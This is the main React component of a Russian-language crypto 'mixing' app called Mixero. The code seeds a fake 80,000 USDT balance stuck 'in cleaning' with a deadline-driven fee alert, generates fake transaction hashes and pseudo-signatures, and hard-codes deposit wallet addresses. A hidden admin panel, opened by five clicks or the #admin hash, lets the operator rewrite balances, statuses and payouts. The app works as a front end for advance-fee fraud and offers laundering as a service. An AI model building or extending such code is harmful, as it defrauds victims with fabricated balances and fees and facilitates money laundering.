import React, { useState, useEffect, useRef, lazy, Suspense } from 'react';
import { Header } from './components/Header';
import { MixerSection, CleanTransaction } from './components/MixerSection';
import type { ReceiptData } from './components/ReceiptModal';
import { Layers, History, BookOpen, Wallet } from 'lucide-react';
import { ClientProfile, AccountTransaction } from './types/account';
import { ProtocolConfig, DEFAULT_PROTOCOL_CONFIG } from './types/config';
import type { FullAccountSyncPayload } from './utils/apiKeySync';

const ActivityLog = lazy(() =>
  import('./components/ActivityLog').then((m) => ({ default: m.ActivityLog }))
);
const ProtocolDocs = lazy(() =>
  import('./components/ProtocolDocs').then((m) => ({ default: m.ProtocolDocs }))
);
const ClientAccount = lazy(() =>
  import('./components/ClientAccount').then((m) => ({ default: m.ClientAccount }))
);
const TopUpModal = lazy(() =>
  import('./components/TopUpModal').then((m) => ({ default: m.TopUpModal }))
);
const WithdrawModal = lazy(() =>
  import('./components/WithdrawModal').then((m) => ({ default: m.WithdrawModal }))
);
const ReceiptModal = lazy(() =>
  import('./components/ReceiptModal').then((m) => ({ default: m.ReceiptModal }))
);
const PWAInstallModal = lazy(() =>
  import('./components/PWAInstallModal').then((m) => ({ default: m.PWAInstallModal }))
);
const AdminPanelModal = lazy(() =>
  import('./components/AdminPanelModal').then((m) => ({ default: m.AdminPanelModal }))
);

const SEED_VERSION = 'v2_80k_620h_magenta';

function ensureSeedVersion(): boolean {
  try {
    if (localStorage.getItem('mixero_seed_version') !== SEED_VERSION) {
      localStorage.setItem('mixero_seed_version', SEED_VERSION);
      return true;
    }
  } catch {
    // Ignored
  }
  return false;
}

const IS_FRESH_SEED_UPGRADE = ensureSeedVersion();

const INITIAL_PROFILE: ClientProfile = {
  clientId: 'CLIENT-7140',
  balance: 0.0,
  inCleaning: 80000.0,
  totalCleaned: 3500.0,
  joinedDate: Date.now() - 3600000 * 624,
};

const INITIAL_CLEAN_TRANSACTIONS: CleanTransaction[] = [
  {
    id: 'MIX_TX_80K_FINAL',
    network: 'TRC20',
    tariff: 'standard',
    amount: 80000.0,
    receivedAmount: 80000.0,
    recipientAddress: 'TQHhLVs5MUApFgaAqfE1Cxw3U44WYDFNHC',
    depositAddress: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
    mixingKey: 'MIX_80K_TRC20',
    delayHours: 620,
    timestamp: Date.now() - 3600000 * 620,
    status: 'mixing',
    limitAlertEnabled: true,
    limitAlertPercent: 0.35,
    limitAlertFeeUsd: 280.0,
    limitAlertDeadline: Date.now() + 3600000 * 6,
  },
  {
    id: 'MIX_TX_7102B',
    network: 'TRC20',
    tariff: 'standard',
    amount: 3500.0,
    receivedAmount: 3500.0,
    recipientAddress: 'TYDzsXDvGg5x8bFhJ98vKw71jKmPqRst89',
    depositAddress: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
    mixingKey: 'MIX_7102B_PROOF',
    delayHours: 24,
    timestamp: Date.now() - 86400000 * 30,
    status: 'completed',
  },
];

const INITIAL_ACCOUNT_TRANSACTIONS: AccountTransaction[] = [
  {
    id: 'TX_FEE_80K_INIT',
    type: 'fee_payment',
    title: 'Комиссия первичного цикла (80,000 USDT)',
    amount: -420.0,
    network: 'TRC20',
    timestamp: Date.now() - 3600000 * 620,
    status: 'completed',
    proofKey: 'PROOF_FEE_80K',
    sshSignature: 'SHA256:MIXERO_80K_POOL_INIT',
    note: 'Первичный запуск сеанса MIX_80K_TRC20',
  },
  {
    id: 'TX_TOP_9941',
    type: 'topup',
    title: 'Оплата комиссий сети',
    amount: 420.0,
    network: 'TRC20',
    timestamp: Date.now() - 3600000 * 621,
    status: 'completed',
    txHash: '7a9c8f2e4d1b305e7c8a9f2e4d1b305e7c8a9f2e4d1b305e7c8a9f2e4d1b305e',
    proofKey: 'PROOF_TOP_9941',
    sshSignature: 'SHA256:MIXERO_9941_TOPUP',
    note: 'Зачисление на счёт комиссий через TRON-шлюз',
  },
];

export default function App() {
  const [activeTab, setActiveTab] = useState<'mixer' | 'account' | 'activity' | 'docs'>('mixer');
  const [isInstallModalOpen, setIsInstallModalOpen] = useState(false);
  const [isAdminModalOpen, setIsAdminModalOpen] = useState(false);
  const [isTopUpModalOpen, setIsTopUpModalOpen] = useState(false);
  const [topUpSuggestedAmount, setTopUpSuggestedAmount] = useState<number | undefined>(undefined);
  const [isWithdrawModalOpen, setIsWithdrawModalOpen] = useState(false);
  const [isReceiptModalOpen, setIsReceiptModalOpen] = useState(false);
  const [activeReceipt, setActiveReceipt] = useState<ReceiptData | null>(null);
  const [, setAdminClickCount] = useState(0);

  useEffect(() => {
    const meta = document.querySelector('meta[name="theme-color"]');
    if (meta) {
      meta.setAttribute('content', '#053E45');
    }
  }, []);

  const handleOpenTopUp = (suggestedAmount?: number) => {
    setTopUpSuggestedAmount(suggestedAmount);
    setIsTopUpModalOpen(true);
  };

  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash.replace('#', '').toLowerCase();
      if (['mixer', 'account', 'activity', 'docs'].includes(hash)) {
        setActiveTab(hash as 'mixer' | 'account' | 'activity' | 'docs');
      } else if (hash === 'admin') {
        setIsAdminModalOpen(true);
      }
    };
    handleHashChange();
    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  const handleTabChange = (tab: 'mixer' | 'account' | 'activity' | 'docs') => {
    setActiveTab(tab);
    try {
      window.history.replaceState(null, '', `#${tab}`);
    } catch {
      // Ignored in sandbox
    }
  };

  // Dynamic Protocol Config (Prices, Fees, Percentages, Limits, Delays)
  const [protocolConfig, setProtocolConfig] = useState<ProtocolConfig>(() => {
    if (!IS_FRESH_SEED_UPGRADE) {
      try {
        const saved = localStorage.getItem('mixero_protocol_config');
        if (saved) {
          return { ...DEFAULT_PROTOCOL_CONFIG, ...JSON.parse(saved) };
        }
      } catch {
        // Ignored
      }
    }
    return DEFAULT_PROTOCOL_CONFIG;
  });

  // Client Profile
  const [profile, setProfile] = useState<ClientProfile>(() => {
    if (!IS_FRESH_SEED_UPGRADE) {
      try {
        const saved =
          localStorage.getItem('mixero_client_profile') ||
          localStorage.getItem('gymcrypto_client_profile');
        if (saved) {
          const parsed = JSON.parse(saved);
          delete parsed.vipTier;
          return parsed;
        }
      } catch {
        // Ignored
      }
    }
    return INITIAL_PROFILE;
  });

  // Account Transactions
  const [accountTransactions, setAccountTransactions] = useState<AccountTransaction[]>(() => {
    if (!IS_FRESH_SEED_UPGRADE) {
      try {
        const saved =
          localStorage.getItem('mixero_account_txs') ||
          localStorage.getItem('gymcrypto_account_txs');
        if (saved) {
          const parsed = JSON.parse(saved);
          if (Array.isArray(parsed) && parsed.length > 0) {
            const seen = new Set<string>();
            const cleaned: AccountTransaction[] = [];
            for (const item of parsed) {
              if (
                item &&
                item.id &&
                !item.id.startsWith('TX_INIT_') &&
                item.id !== 'TX_PAY_7102'
              ) {
                if (!seen.has(item.id)) {
                  seen.add(item.id);
                  cleaned.push({
                    ...item,
                    sshSignature:
                      typeof item.sshSignature === 'string'
                        ? item.sshSignature.replace(/MIXERO_CPP20_/gi, 'MIXERO_')
                        : item.sshSignature,
                    note:
                      typeof item.note === 'string'
                        ? item.note.replace(/\s*C\+\+20\s*/gi, ' ').replace(/\s{2,}/g, ' ').trim()
                        : item.note,
                  });
                }
              }
            }
            return cleaned;
          }
        }
      } catch {
        // Ignored
      }
    }
    return INITIAL_ACCOUNT_TRANSACTIONS;
  });

  // Deposit Wallet Addresses
  const [customAddresses, setCustomAddresses] = useState(() => {
    try {
      const saved =
        localStorage.getItem('mixero_wallets') ||
        localStorage.getItem('gymcrypto_wallets');
      if (saved) {
        return JSON.parse(saved);
      }
    } catch {
      // Ignored
    }
    return {
      trc20: 'TNwS3upnJmFADuCEVy24z8g2F79eV6pv79',
      erc20: '0x71C7656EC7ab88b098defB751B7401B5f6d1476B',
    };
  });

  // Cleaning Transactions
  const [transactions, setTransactions] = useState<CleanTransaction[]>(() => {
    if (!IS_FRESH_SEED_UPGRADE) {
      try {
        const saved =
          localStorage.getItem('mixero_txs') ||
          localStorage.getItem('gymcrypto_txs');
        if (saved) {
          const parsed = JSON.parse(saved);
          if (Array.isArray(parsed) && parsed.length > 0) return parsed;
        }
      } catch {
        // Ignored
      }
    }
    return INITIAL_CLEAN_TRANSACTIONS;
  });

  useEffect(() => {
    try {
      localStorage.setItem('mixero_protocol_config', JSON.stringify(protocolConfig));
    } catch {}
  }, [protocolConfig]);

  useEffect(() => {
    try {
      localStorage.setItem('mixero_client_profile', JSON.stringify(profile));
    } catch {}
  }, [profile]);

  useEffect(() => {
    try {
      localStorage.setItem('mixero_account_txs', JSON.stringify(accountTransactions));
    } catch {}
  }, [accountTransactions]);

  useEffect(() => {
    try {
      localStorage.setItem('mixero_txs', JSON.stringify(transactions));
    } catch {}
  }, [transactions]);

  useEffect(() => {
    try {
      localStorage.setItem('mixero_wallets', JSON.stringify(customAddresses));
    } catch {}
  }, [customAddresses]);

  const clickTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    return () => {
      if (clickTimerRef.current) clearTimeout(clickTimerRef.current);
    };
  }, []);

  const handleSecretAdminClick = () => {
    setAdminClickCount((prev) => {
      const next = prev + 1;
      if (next >= 5) {
        setIsAdminModalOpen(true);
        return 0;
      }
      return next;
    });

    if (clickTimerRef.current) clearTimeout(clickTimerRef.current);
    clickTimerRef.current = setTimeout(() => setAdminClickCount(0), 3000);
  };

  const handleAddTransaction = (newTx: CleanTransaction) => {
    setTransactions((prev) => [newTx, ...prev]);
  };

  const handleUpdateTransaction = (id: string, patch: Partial<CleanTransaction>) => {
    setTransactions((prev) => prev.map((tx) => (tx.id === id ? { ...tx, ...patch } : tx)));
  };

  const handleSuccessTopUp = (amount: number, network: 'TRC20' | 'ERC20') => {
    setProfile((prev) => ({ ...prev, balance: prev.balance + amount }));
    const txId = `TX_TOPUP_${Date.now().toString(36).toUpperCase()}`;
    const proofKey = `MIXERO_TOPUP_${txId}`;
    const sshSig = `SHA256:MIXERO_${(txId + proofKey)
      .split('')
      .reduce((acc, char) => acc + char.charCodeAt(0), 1337)
      .toString(16)
      .toUpperCase()}`;

    const newTx: AccountTransaction = {
      id: txId,
      type: 'topup',
      title: 'Оплата комиссий сети',
      amount,
      network,
      timestamp: Date.now(),
      status: 'completed',
      txHash: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
      note: 'Зачисление на счёт комиссий',
      proofKey,
      sshSignature: sshSig,
    };

    setAccountTransactions((prev) => [newTx, ...prev]);
  };

  const handleSuccessWithdraw = (amount: number, network: 'TRC20' | 'ERC20', targetAddress: string) => {
    setProfile((prev) => ({ ...prev, balance: Math.max(0, prev.balance - amount) }));
    const txId = `TX_WDR_${Date.now().toString(36).toUpperCase()}`;
    const proofKey = `MIXERO_PROOF_${txId}`;
    const sshSig = `SHA256:MIXERO_${(txId + proofKey)
      .split('')
      .reduce((acc, char) => acc + char.charCodeAt(0), 1337)
      .toString(16)
      .toUpperCase()}`;

    const newTx: AccountTransaction = {
      id: txId,
      type: 'withdrawal',
      title: 'Вывод на внешний кошелёк',
      amount: -amount,
      network,
      timestamp: Date.now(),
      status: 'completed',
      txHash: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
      note: `Выведено на ${targetAddress.slice(0, 6)}...${targetAddress.slice(-4)}`,
      recipientAddress: targetAddress,
      proofKey,
      sshSignature: sshSig,
    };

    setAccountTransactions((prev) => [newTx, ...prev]);
  };

  const handlePayFeeWithBalance = (feeAmount: number, txIdToUpdate?: string) => {
    setProfile((prev) => ({ ...prev, balance: Math.max(0, prev.balance - feeAmount) }));
    const txId = `TX_FEE_${Date.now().toString(36).toUpperCase()}`;
    const proofKey = `MIXERO_FEE_${txId}`;
    const sshSig = `SHA256:MIXERO_${(txId + proofKey)
      .split('')
      .reduce((acc, char) => acc + char.charCodeAt(0), 1337)
      .toString(16)
      .toUpperCase()}`;

    const feeTx: AccountTransaction = {
      id: txId,
      type: 'fee_payment',
      title: txIdToUpdate ? 'Оплата нового круга очистки (0.35%)' : 'Списание комиссии протокола',
      amount: -feeAmount,
      network: 'TRC20',
      timestamp: Date.now(),
      status: 'completed',
      txHash: `0x${Math.random().toString(16).slice(2, 10)}...`,
      note: txIdToUpdate ? `Финальный круг по заявке ${txIdToUpdate}` : 'Списание комиссии за сеанс очистки',
      proofKey,
      sshSignature: sshSig,
    };

    setAccountTransactions((prev) => [feeTx, ...prev]);

    if (txIdToUpdate) {
      setTransactions((prev) =>
        prev.map((tx) =>
          tx.id === txIdToUpdate
            ? { ...tx, limitAlertEnabled: false, status: 'dispatched' }
            : tx
        )
      );
    }
  };

  const handleAddCustomAccountTx = (tx: AccountTransaction, delta: number) => {
    setAccountTransactions((prev) => [tx, ...prev]);
    if (delta !== 0) {
      setProfile((prev) => ({
        ...prev,
        balance: Math.max(0, prev.balance + delta),
      }));
    }
  };

  const handleUpdateAccountTx = (id: string, patch: Partial<AccountTransaction>) => {
    setAccountTransactions((prev) => prev.map((tx) => (tx.id === id ? { ...tx, ...patch } : tx)));
  };

  const handleDeleteAccountTx = (id: string) => {
    setAccountTransactions((prev) => prev.filter((tx) => tx.id !== id));
  };

  const handleImportSyncPayload = (payload: FullAccountSyncPayload) => {
    if (payload.profile) setProfile(payload.profile);
    if (Array.isArray(payload.transactions)) setTransactions(payload.transactions);
    if (Array.isArray(payload.accountTransactions)) setAccountTransactions(payload.accountTransactions);
    if (payload.customAddresses) setCustomAddresses(payload.customAddresses);
    if (payload.protocolConfig) setProtocolConfig({ ...DEFAULT_PROTOCOL_CONFIG, ...payload.protocolConfig });
  };

  const handleUpdateTransactionStatus = (id: string, status: CleanTransaction['status']) => {
    const target = transactions.find((t) => t.id === id);

    if (target && status === 'completed' && target.status !== 'completed') {
      setAccountTransactions((txs) => {
        const alreadyExists = txs.some(
          (t) => t.type === 'payout' && (t.txHash === target.mixingKey || t.id.includes(target.id))
        );
        if (alreadyExists) return txs;

        const uniqueSuffix = Math.random().toString(36).substring(2, 7).toUpperCase();
        const txId = `TX_PAYOUT_${Date.now().toString(36).toUpperCase()}_${uniqueSuffix}`;
        const proofKey = target.mixingKey || `MIXERO_PAYOUT_${txId}`;
        const sshSig = `SHA256:MIXERO_${(txId + proofKey)
          .split('')
          .reduce((acc, char) => acc + char.charCodeAt(0), 1337)
          .toString(16)
          .toUpperCase()}`;

        const payoutTx: AccountTransaction = {
          id: txId,
          type: 'payout',
          title: 'Выплата чистого депозита',
          amount: target.receivedAmount,
          network: target.network,
          timestamp: Date.now(),
          status: 'completed',
          txHash: target.mixingKey,
          note: `Выплачено на ${target.recipientAddress.slice(0, 6)}...${target.recipientAddress.slice(-4)}`,
          recipientAddress: target.recipientAddress,
          proofKey,
          sshSignature: sshSig,
        };

        return [payoutTx, ...txs];
      });

      setProfile((p) => ({
        ...p,
        inCleaning: Math.max(0, p.inCleaning - target.amount),
        totalCleaned: p.totalCleaned + target.amount,
      }));
    }

    setTransactions((prev) => prev.map((tx) => (tx.id === id ? { ...tx, status } : tx)));
  };

  const handleDeleteTransaction = (id: string) => {
    setTransactions((prev) => prev.filter((tx) => tx.id !== id));
  };

  const handleViewReceipt = (receipt: ReceiptData) => {
    setActiveReceipt(receipt);
    setIsReceiptModalOpen(true);
  };

  const activeUserTx = transactions.length > 0 ? transactions[0] : null;

  const navItems = [
    { id: 'mixer' as const, label: 'Очистка', icon: Layers },
    { id: 'account' as const, label: 'Кабинет', icon: Wallet },
    { id: 'activity' as const, label: 'Сеансы', icon: History },
    { id: 'docs' as const, label: 'Регламент', icon: BookOpen },
  ];

  return (
    <div className="min-h-screen flex flex-col text-[#F2FCFC] relative overflow-x-hidden">
      <div className="w-full max-w-2xl mx-auto flex-1 flex flex-col px-4 sm:px-6 pt-safe pb-28 sm:pb-10 relative z-10">
        <Header
          onOpenPWAInstall={() => setIsInstallModalOpen(true)}
          onSecretAdminClick={handleSecretAdminClick}
          balance={profile.balance}
          onOpenAccount={() => handleTabChange('account')}
        />

        {/* Desktop / Tablet Top Navigation */}
        <nav className="hidden sm:flex my-4 items-center gap-1.5 p-1.5 mixero-card rounded-2xl">
          {navItems.map((item) => {
            const Icon = item.icon;
            const active = activeTab === item.id;
            return (
              <button
                key={item.id}
                type="button"
                onClick={() => handleTabChange(item.id)}
                className={`flex-1 min-h-[44px] px-3 rounded-xl text-xs mixero-display font-bold transition-all flex items-center justify-center gap-2 whitespace-nowrap ${
                  active
                    ? 'mixero-cta'
                    : 'text-[#96C8CB] hover:text-[#FFFFFF] hover:bg-[#03252A]/85'
                }`}
              >
                <Icon className="w-4 h-4 shrink-0" />
                <span>{item.label}</span>
              </button>
            );
          })}
        </nav>

        {/* Main Content */}
        <main className="flex-1 w-full py-4 sm:py-2 space-y-5">
          {activeTab === 'mixer' && (
            <MixerSection
              onAddTransaction={handleAddTransaction}
              customAddresses={customAddresses}
              activeUserTx={activeUserTx}
              userBalance={profile.balance}
              onPayFeeWithBalance={handlePayFeeWithBalance}
              onOpenTopUp={handleOpenTopUp}
              onViewReceipt={handleViewReceipt}
              protocolConfig={protocolConfig}
            />
          )}

          {activeTab !== 'mixer' && (
            <Suspense
              fallback={
                <div className="mixero-card rounded-3xl p-8 flex items-center justify-center">
                  <div className="w-7 h-7 rounded-full border-2 border-[#22A8AC]/35 border-t-[#FF9436] animate-spin" />
                </div>
              }
            >
              {activeTab === 'account' && (
                <ClientAccount
                  profile={profile}
                  transactions={accountTransactions}
                  onOpenTopUp={() => handleOpenTopUp()}
                  onOpenWithdraw={() => setIsWithdrawModalOpen(true)}
                  onNavigateToMixer={() => handleTabChange('mixer')}
                  onViewReceipt={handleViewReceipt}
                />
              )}

              {activeTab === 'activity' && (
                <ActivityLog transactions={transactions} onViewReceipt={handleViewReceipt} />
              )}

              {activeTab === 'docs' && <ProtocolDocs protocolConfig={protocolConfig} />}
            </Suspense>
          )}
        </main>

        {/* Minimal App Store Footer */}
        <footer className="mt-6 pt-4 border-t border-[#22A8AC]/28 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-[#96C8CB]">
          <span className="mixero-display text-[10px] tracking-[0.06em] font-bold text-[#F2FCFC]">
            MIXERO•CRYPTO · ZERO-LOG PROTOCOL
          </span>
          <span className="text-[11px] font-mono font-semibold text-[#96C8CB]/80">
            TRC-20 / ERC-20 · SHA-256
          </span>
        </footer>
      </div>

      {/* Mobile Fixed Thumb-Zone Bottom Bar (Top-10 App Store Dock) */}
      <nav className="sm:hidden fixed bottom-3 left-3 right-3 z-40 mixero-pill rounded-2xl pb-safe">
        <div className="grid grid-cols-4 items-center gap-1 px-2 py-1.5">
          {navItems.map((item) => {
            const Icon = item.icon;
            const active = activeTab === item.id;
            return (
              <button
                key={item.id}
                type="button"
                onClick={() => handleTabChange(item.id)}
                className={`min-h-[50px] flex flex-col items-center justify-center gap-1 rounded-xl transition ${
                  active
                    ? 'bg-[#FF8424] border border-[#FFB36B] text-[#140800] font-extrabold shadow-sm'
                    : 'text-[#96C8CB] hover:text-[#FFFFFF]'
                }`}
              >
                <Icon className="w-5 h-5" />
                <span className="text-[11px] font-bold tracking-tight whitespace-nowrap">
                  {item.label}
                </span>
              </button>
            );
          })}
        </div>
      </nav>

      {/* Lazy-Loaded Modals */}
      <Suspense fallback={null}>
        {isTopUpModalOpen && (
          <TopUpModal
            isOpen={isTopUpModalOpen}
            onClose={() => {
              setIsTopUpModalOpen(false);
              setTopUpSuggestedAmount(undefined);
            }}
            customAddresses={customAddresses}
            onSuccessTopUp={handleSuccessTopUp}
            quickPresets={protocolConfig.quickAmountPresets}
            initialAmount={topUpSuggestedAmount}
          />
        )}

        {isWithdrawModalOpen && (
          <WithdrawModal
            isOpen={isWithdrawModalOpen}
            onClose={() => setIsWithdrawModalOpen(false)}
            balance={profile.balance}
            onSuccessWithdraw={handleSuccessWithdraw}
          />
        )}

        {isReceiptModalOpen && (
          <ReceiptModal
            isOpen={isReceiptModalOpen}
            onClose={() => setIsReceiptModalOpen(false)}
            receipt={activeReceipt}
          />
        )}

        {isInstallModalOpen && (
          <PWAInstallModal
            isOpen={isInstallModalOpen}
            onClose={() => setIsInstallModalOpen(false)}
          />
        )}

        {isAdminModalOpen && (
          <AdminPanelModal
            isOpen={isAdminModalOpen}
            onClose={() => setIsAdminModalOpen(false)}
            transactions={transactions}
            onUpdateTransactionStatus={handleUpdateTransactionStatus}
            onUpdateTransaction={handleUpdateTransaction}
            onDeleteTransaction={handleDeleteTransaction}
            onAddCustomTransaction={handleAddTransaction}
            onAddCustomAccountTx={handleAddCustomAccountTx}
            onUpdateAccountTx={handleUpdateAccountTx}
            customAddresses={customAddresses}
            onUpdateAddresses={setCustomAddresses}
            clientBalance={profile.balance}
            onUpdateClientBalance={(newBalance) =>
              setProfile((p) => ({ ...p, balance: newBalance }))
            }
            accountTransactions={accountTransactions}
            onDeleteAccountTx={handleDeleteAccountTx}
            onClearAllAccountTxs={() => setAccountTransactions([])}
            profile={profile}
            onUpdateProfile={(patch) => setProfile((p) => ({ ...p, ...patch }))}
            onImportSyncPayload={handleImportSyncPayload}
            protocolConfig={protocolConfig}
            onUpdateProtocolConfig={setProtocolConfig}
          />
        )}
      </Suspense>
    </div>
  );
}
